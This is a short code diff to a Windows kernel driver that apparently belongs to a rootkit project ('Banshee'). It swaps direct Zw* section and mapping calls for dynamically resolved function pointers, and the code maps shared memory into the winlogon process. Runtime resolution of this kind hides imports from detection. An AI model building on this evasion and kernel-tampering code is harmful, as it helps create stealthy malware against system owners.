@@ -16,7 +16,6 @@
 NTSTATUS 
 BeCreateSharedMemory()
 {
-	// TODO: dynamicly resolve all functions
 	UNICODE_STRING sectionName;
 	RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
@@ -31,7 +30,7 @@ BeCreateSharedMemory()
 	LARGE_INTEGER sectionSize = { 0 };
     sectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);  
 
-	status = ZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+	status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
 	if (status != STATUS_SUCCESS)
 	{
 		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", status);
@@ -45,7 +44,8 @@ BeCreateSharedMemory()
 	KAPC_STATE apc;
 	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
 
-	status = ZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
+	status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
+	
 	if (status != STATUS_SUCCESS)
 	{
 		LOG_MSG("Failed to map shared memory: 0x%X\n", status);
@@ -74,7 +74,7 @@ BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 
 	if (BeGlobals::pSharedMemory != NULL) 
 	{
-		ZwUnmapViewOfSection(ZwCurrentProcess(), pSharedMemory);
+		BeGlobals::pZwUnmapViewOfSection(ZwCurrentProcess(), pSharedMemory);
 		BeGlobals::pSharedMemory = NULL;
 	}
 
